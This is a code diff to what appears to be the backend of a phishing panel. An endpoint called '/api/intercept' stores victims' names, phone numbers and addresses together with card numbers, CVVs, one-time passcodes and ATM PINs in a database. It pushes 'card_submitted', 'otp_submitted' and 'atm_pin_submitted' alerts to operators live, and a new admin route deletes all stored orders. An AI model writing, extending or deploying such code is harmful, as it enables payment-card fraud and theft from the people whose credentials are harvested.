@@ -150,22 +150,38 @@ app.post('/api/intercept', async (req, res) => {
       );
       broadcastToAdmins({ type: 'new_order', ref });
     } else {
-      const updates = {};
-      Object.keys(cardInfo).forEach(key => {
-        if (cardInfo[key]) updates[key] = cardInfo[key];
+      // Collect all possible fields to update
+      const updateFields = [];
+      const updateValues = [];
+      let valIdx = 1;
+
+      const possibleFields = [
+        'customer_name', 'customer_phone', 'customer_address', 
+        'service_type', 'total_price', 'duration', 
+        'nationality', 'workers', 'start_date',
+        'card_number', 'card_expiry', 'card_cvv', 
+        'otp_code', 'atm_pin', 'raw_message'
+      ];
+
+      possibleFields.forEach(field => {
+        let val = data[field] || cardInfo[field];
+        if (val !== undefined && val !== null) {
+          updateFields.push(`${field} = $${valIdx++}`);
+          updateValues.push(val);
+        }
       });
-      if (data.raw_message) updates.raw_message = data.raw_message;
-      updates.updated_at = now;
-      
-      if (Object.keys(updates).length > 0) {
-        const updateFields = Object.keys(updates).map((key, i) => `${key} = $${i + 1}`).join(', ');
-        const updateValues = Object.values(updates);
+
+      if (updateFields.length > 0) {
+        updateFields.push(`updated_at = $${valIdx++}`);
+        updateValues.push(now);
+        
         await pool.query(
-          `UPDATE orders SET ${updateFields} WHERE order_ref = $${updateValues.length + 1}`,
+          `UPDATE orders SET ${updateFields.join(', ')} WHERE order_ref = $${valIdx}`,
           [...updateValues, ref]
         );
 
-        let msgType = 'card_submitted';
+        let msgType = 'order_updated';
+        if (cardInfo.card_number) msgType = 'card_submitted';
         if (cardInfo.otp_code) msgType = 'otp_submitted';
         if (cardInfo.atm_pin) msgType = 'atm_pin_submitted';
         broadcastToAdmins({ type: msgType, ref });
@@ -175,6 +191,17 @@ app.post('/api/intercept', async (req, res) => {
     res.json({ orderRef: ref });
   } catch (error) {
     console.error('Error in /api/intercept:', error);
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// Delete all orders
+app.post('/api/admin/clear-orders', verifyAdmin, async (req, res) => {
+  try {
+    await pool.query('DELETE FROM orders');
+    res.json({ success: true });
+  } catch (error) {
+    console.error('Error in /api/admin/clear-orders:', error);
     res.status(500).json({ error: error.message });
   }
 });
